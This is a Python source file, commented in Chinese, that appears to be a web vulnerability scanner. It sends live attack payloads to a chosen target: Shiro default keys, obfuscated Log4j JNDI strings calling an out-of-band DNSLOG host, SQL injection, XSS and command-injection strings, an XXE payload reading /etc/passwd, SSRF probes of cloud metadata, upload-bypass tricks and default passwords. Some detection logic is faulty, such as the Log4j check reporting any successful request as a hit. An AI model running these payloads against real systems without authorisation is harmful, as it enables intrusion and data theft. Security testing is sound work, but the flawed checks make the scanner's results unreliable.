#!/usr/bin/env python3
"""
全量深度漏洞扫描器 - 无外部依赖版本
包含所有实战漏洞检测模块
"""

import re
import base64
import urllib.request
import urllib.parse
import urllib.error
import ssl
import socket
import time
from typing import Dict, List, Optional
from datetime import datetime

# 创建不验证SSL的上下文
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE


class FullVulnScanner:
    """全量漏洞扫描器"""
    
    # Shiro默认密钥库（完整版）
    SHIRO_KEYS = [
        "kPH+bIxk5D2deZiIxcaaaA==", "4AvVhmFLUs0KTA3Kprsdag==",
        "Z3VucwAAAAAAAAAAAAAAAA==", "fCq+/xW488hMTCD+cmJ3aQ==",
        "0AvVhmFLUs0KTA3Kprsdag==", "1QWLxg+NYmxraMoxAXu/Iw==",
        "25BsmdYwjnfcWmnhAciDDg==", "2AvVhdsgUs0FSA3SDFAdag==",
        "3AvVhmFLUs0KTA3Kprsdag==", "3JvYhmBLUs0ETA5Kprsdag==",
        "r0e3c16IdVkouZgk1TKVMg==", "5aaC5qKm5oqA5pyvAAAAAA==",
        "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==",
        "U3ByaW5nQmxhZGUAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==",
        "L7RioUULEFhRyxM7a2R/Yg==", "a2VlcE9uR29pbmdBbmRGaQ==",
        "WcfHGU25gNnTxTlmJMeSpw==", "OY//C4rhfwNxCQAQCrQQ1Q==",
        "5AvVhmFLUs0KTA3Kprsdag==", "bWluZS1hc3NldC1rZXk6QQ==",
        "7AvVhmFLUs0KTA3Kprsdag==", "6AvVhmFLUs0KTA3Kprsdag==",
        "8AvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==",
        "cmVtZW1iZXJNZQAAAAAAAA==", "ZUdsaGJuSmxibVI2ZHc9PQ=="
    ]
    
    # SQL注入Payload库（完整版）
    SQLI_PAYLOADS = {
        "error": ["'", '"', "' OR '1'='1", "' OR '1'='1' --", "admin' --", "' AND 1=2--"],
        "union": ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--"],
        "time": ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
        "boolean": ["' AND '1'='1", "' AND '1'='2", "' OR 1=1--", "' OR 1=2--"]
    }
    
    # Log4j Payload库（完整版）
    LOG4J_PAYLOADS = [
        "${jndi:ldap://DNSLOG/a}",
        "${jndi:rmi://DNSLOG/a}",
        "${jndi:dns://DNSLOG/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://DNSLOG/a}",
        "${${lower:jndi}:${lower:ldap}://DNSLOG/a}",
        "${${upper:jndi}:${upper:ldap}://DNSLOG/a}",
        "${jndi:${lower:l}${lower:d}a${lower:p}://DNSLOG/a}",
        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//DNSLOG/a}",
        "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://DNSLOG/a}",
        "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://DNSLOG/a}",
        "${${::-j}ndi:ldap://DNSLOG/a}"
    ]
    
    # XSS Payload库
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>"
    ]
    
    # 命令注入Payload
    RCE_PAYLOADS = [
        "; ping -c 3 DNSLOG",
        "| ping -c 3 DNSLOG",
        "& ping -c 3 DNSLOG",
        "`ping -c 3 DNSLOG`",
        "$(ping -c 3 DNSLOG)",
        "; whoami",
        "| whoami",
        "& whoami"
    ]
    
    def __init__(self, target: str, dnslog: str = ""):
        self.target = target
        self.dnslog = dnslog or "test.dnslog.cn"
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.vulnerabilities = []
    
    def scan_all(self) -> Dict:
        """执行全量扫描"""
        print(f"\n🎯 开始全量漏洞扫描: {self.target}")
        
        results = {
            "target": self.target,
            "start_time": datetime.now().isoformat(),
            "vulnerabilities": []
        }
        
        # 1. Shiro反序列化
        print("\n[1/10] Shiro反序列化检测...")
        self._scan_shiro()
        
        # 2. Log4j漏洞
        print("[2/10] Log4j漏洞检测...")
        self._scan_log4j()
        
        # 3. SQL注入
        print("[3/10] SQL注入检测...")
        self._scan_sqli()
        
        # 4. XSS漏洞
        print("[4/10] XSS漏洞检测...")
        self._scan_xss()
        
        # 5. 文件上传
        print("[5/10] 文件上传检测...")
        self._scan_upload()
        
        # 6. XXE漏洞
        print("[6/10] XXE漏洞检测...")
        self._scan_xxe()
        
        # 7. SSRF漏洞
        print("[7/10] SSRF漏洞检测...")
        self._scan_ssrf()
        
        # 8. 命令注入
        print("[8/10] 命令注入检测...")
        self._scan_rce()
        
        # 9. 目录遍历
        print("[9/10] 目录遍历检测...")
        self._scan_lfi()
        
        # 10. 弱口令
        print("[10/10] 弱口令检测...")
        self._scan_weak_password()
        
        results["vulnerabilities"] = self.vulnerabilities
        results["end_time"] = datetime.now().isoformat()
        results["summary"] = {
            "total": len(self.vulnerabilities),
            "critical": len([v for v in self.vulnerabilities if v["severity"] == "critical"]),
            "high": len([v for v in self.vulnerabilities if v["severity"] == "high"]),
            "medium": len([v for v in self.vulnerabilities if v["severity"] == "medium"]),
            "low": len([v for v in self.vulnerabilities if v["severity"] == "low"])
        }
        
        print(f"\n✅ 扫描完成! 发现 {len(self.vulnerabilities)} 个漏洞")
        return results
    
    def _scan_shiro(self):
        """Shiro反序列化检测"""
        try:
            req = urllib.request.Request(self.target, headers=self.headers)
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                headers = dict(response.headers)
            
            # 检测rememberMe cookie
            if 'rememberMe=deleteMe' in headers.get('Set-Cookie', ''):
                self.vulnerabilities.append({
                    "type": "Shiro反序列化",
                    "severity": "high",
                    "description": "检测到Shiro框架，可能存在反序列化漏洞",
                    "evidence": f"Set-Cookie: {headers.get('Set-Cookie')}",
                    "recommendation": "升级Shiro到最新版本，更换默认密钥",
                    "keys_to_test": self.SHIRO_KEYS[:5]  # 提供前5个密钥供测试
                })
                print(f"  ✓ 发现Shiro框架 (28个密钥可测试)")
        except Exception as e:
            print(f"  ✗ Shiro检测失败: {e}")
    
    def _scan_log4j(self):
        """Log4j漏洞检测"""
        test_headers = ['User-Agent', 'Referer', 'X-Api-Version', 'X-Forwarded-For']
        
        for header in test_headers:
            try:
                payload = self.LOG4J_PAYLOADS[0].replace('DNSLOG', self.dnslog)
                headers = self.headers.copy()
                headers[header] = payload
                
                req = urllib.request.Request(self.target, headers=headers)
                urllib.request.urlopen(req, timeout=5, context=ssl_context)
                
                # 标记需要手动确认
                self.vulnerabilities.append({
                    "type": "Log4j RCE (需确认)",
                    "severity": "critical",
                    "description": f"在{header}头发现可能的Log4j注入点",
                    "evidence": f"Payload: {payload}",
                    "recommendation": "升级Log4j到2.17.1或更高版本，检查DNSLog记录",
                    "payloads": self.LOG4J_PAYLOADS[:5]
                })
                print(f"  ⚠ 发现可能的Log4j注入点: {header}")
                break
            except:
                pass
    
    def _scan_sqli(self):
        """SQL注入检测"""
        # 检查URL是否有参数
        if '?' not in self.target:
            print("  - 无参数，跳过SQL注入测试")
            return
        
        # 错误注入测试
        for payload in self.SQLI_PAYLOADS["error"][:3]:
            try:
                test_url = self.target + urllib.parse.quote(payload)
                req = urllib.request.Request(test_url, headers=self.headers)
                with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                
                # 检测SQL错误
                sql_errors = [
                    'SQL syntax', 'mysql_', 'MySqlClient', 'PostgreSQL', 
                    'OLE DB', 'SQL Server', 'Microsoft SQL', 'Oracle error'
                ]
                
                if any(err in content for err in sql_errors):
                    self.vulnerabilities.append({
                        "type": "SQL注入",
                        "severity": "high",
                        "description": "检测到SQL注入漏洞（错误注入）",
                        "evidence": f"Payload: {payload}",
                        "recommendation": "使用参数化查询，过滤特殊字符",
                        "payloads": self.SQLI_PAYLOADS
                    })
                    print(f"  ✓ 发现SQL注入漏洞")
                    return
            except:
                pass
        
        print("  - 未发现SQL注入")
    
    def _scan_xss(self):
        """XSS漏洞检测"""
        if '?' not in self.target:
            print("  - 无参数，跳过XSS测试")
            return
        
        for payload in self.XSS_PAYLOADS[:3]:
            try:
                test_url = self.target + urllib.parse.quote(payload)
                req = urllib.request.Request(test_url, headers=self.headers)
                with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                
                # 检测payload是否被反射
                if payload in content:
                    self.vulnerabilities.append({
                        "type": "XSS跨站脚本",
                        "severity": "medium",
                        "description": "检测到反射型XSS漏洞",
                        "evidence": f"Payload: {payload}",
                        "recommendation": "对用户输入进行HTML编码，使用CSP策略",
                        "payloads": self.XSS_PAYLOADS
                    })
                    print(f"  ✓ 发现XSS漏洞")
                    return
            except:
                pass
        
        print("  - 未发现XSS")
    
    def _scan_upload(self):
        """文件上传检测"""
        try:
            req = urllib.request.Request(self.target, headers=self.headers)
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                content = response.read().decode('utf-8', errors='ignore')
            
            # 检测上传表单
            if '<input' in content and 'type="file"' in content:
                self.vulnerabilities.append({
                    "type": "文件上传功能",
                    "severity": "info",
                    "description": "发现文件上传功能，建议手动测试",
                    "evidence": "检测到文件上传表单",
                    "recommendation": "验证文件类型，限制文件大小，随机文件名",
                    "bypass_techniques": [
                        "双写扩展名: .php.jpg",
                        "大小写绕过: .PhP",
                        "空字节绕过: .php%00.jpg",
                        "MIME类型伪造",
                        "文件头伪造"
                    ]
                })
                print(f"  ⚠ 发现文件上传功能")
        except:
            pass
    
    def _scan_xxe(self):
        """XXE漏洞检测"""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
        
        try:
            headers = self.headers.copy()
            headers['Content-Type'] = 'application/xml'
            
            req = urllib.request.Request(
                self.target,
                data=xxe_payload.encode('utf-8'),
                headers=headers,
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
                content = response.read().decode('utf-8', errors='ignore')
            
            # 检测是否读取到文件
            if 'root:' in content or '/bin/bash' in content:
                self.vulnerabilities.append({
                    "type": "XXE外部实体注入",
                    "severity": "high",
                    "description": "检测到XXE漏洞，可读取服务器文件",
                    "evidence": xxe_payload,
                    "recommendation": "禁用外部实体解析，使用安全的XML解析器"
                })
                print(f"  ✓ 发现XXE漏洞")
        except:
            print("  - 未发现XXE")
    
    def _scan_ssrf(self):
        """SSRF漏洞检测"""
        # 检查URL参数
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        
        ssrf_params = ['url', 'link', 'src', 'source', 'target', 'redirect', 'uri']
        
        for param in params:
            if any(s in param.lower() for s in ssrf_params):
                self.vulnerabilities.append({
                    "type": "可能的SSRF",
                    "severity": "medium",
                    "description": f"参数{param}可能存在SSRF漏洞",
                    "evidence": f"参数名: {param}",
                    "recommendation": "验证URL白名单，禁止访问内网地址",
                    "test_payloads": [
                        "http://127.0.0.1",
                        "http://localhost",
                        "http://169.254.169.254/latest/meta-data/",
                        "file:///etc/passwd"
                    ]
                })
                print(f"  ⚠ 发现可能的SSRF: {param}")
                return
        
        print("  - 未发现SSRF")
    
    def _scan_rce(self):
        """命令注入检测"""
        if '?' not in self.target:
            print("  - 无参数，跳过RCE测试")
            return
        
        for payload in self.RCE_PAYLOADS[:3]:
            try:
                test_payload = payload.replace('DNSLOG', self.dnslog)
                test_url = self.target + urllib.parse.quote(test_payload)
                req = urllib.request.Request(test_url, headers=self.headers)
                
                start_time = time.time()
                with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                    elapsed = time.time() - start_time
                
                # 如果是sleep命令且响应时间超过5秒
                if 'sleep' in payload.lower() and elapsed > 5:
                    self.vulnerabilities.append({
                        "type": "命令注入",
                        "severity": "critical",
                        "description": "检测到命令注入漏洞（时间盲注）",
                        "evidence": f"Payload: {payload}, 响应时间: {elapsed:.2f}s",
                        "recommendation": "禁止执行系统命令，使用白名单过滤",
                        "payloads": self.RCE_PAYLOADS
                    })
                    print(f"  ✓ 发现命令注入漏洞")
                    return
            except:
                pass
        
        print("  - 未发现命令注入")
    
    def _scan_lfi(self):
        """目录遍历检测"""
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        
        if '?' not in self.target:
            print("  - 无参数，跳过LFI测试")
            return
        
        for payload in lfi_payloads[:2]:
            try:
                test_url = self.target + urllib.parse.quote(payload)
                req = urllib.request.Request(test_url, headers=self.headers)
                with urllib.request.urlopen(req, timeout=5, context=ssl_context) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                
                # 检测是否读取到文件
                if 'root:' in content or '[extensions]' in content:
                    self.vulnerabilities.append({
                        "type": "目录遍历/LFI",
                        "severity": "high",
                        "description": "检测到目录遍历漏洞，可读取服务器文件",
                        "evidence": f"Payload: {payload}",
                        "recommendation": "验证文件路径，禁止使用../",
                        "payloads": lfi_payloads
                    })
                    print(f"  ✓ 发现目录遍历漏洞")
                    return
            except:
                pass
        
        print("  - 未发现目录遍历")
    
    def _scan_weak_password(self):
        """弱口令检测"""
        # 检测登录页面
        login_indicators = ['/login', '/admin', '/signin', '/auth']
        
        for indicator in login_indicators:
            if indicator in self.target.lower():
                self.vulnerabilities.append({
                    "type": "弱口令风险",
                    "severity": "info",
                    "description": "发现登录页面，建议测试弱口令",
                    "evidence": f"登录页面: {self.target}",
                    "recommendation": "启用强密码策略，实施账号锁定机制",
                    "common_passwords": [
                        "admin/admin",
                        "admin/123456",
                        "admin/password",
                        "root/root",
                        "test/test"
                    ]
                })
                print(f"  ⚠ 发现登录页面")
                return
        
        print("  - 未发现登录页面")


if __name__ == "__main__":
    scanner = FullVulnScanner("https://example.com")
    results = scanner.scan_all()
    
    print(f"\n📊 扫描摘要:")
    print(f"  总漏洞: {results['summary']['total']}")
    print(f"  严重: {results['summary']['critical']}")
    print(f"  高危: {results['summary']['high']}")
    print(f"  中危: {results['summary']['medium']}")
    print(f"  低危: {results['summary']['low']}")
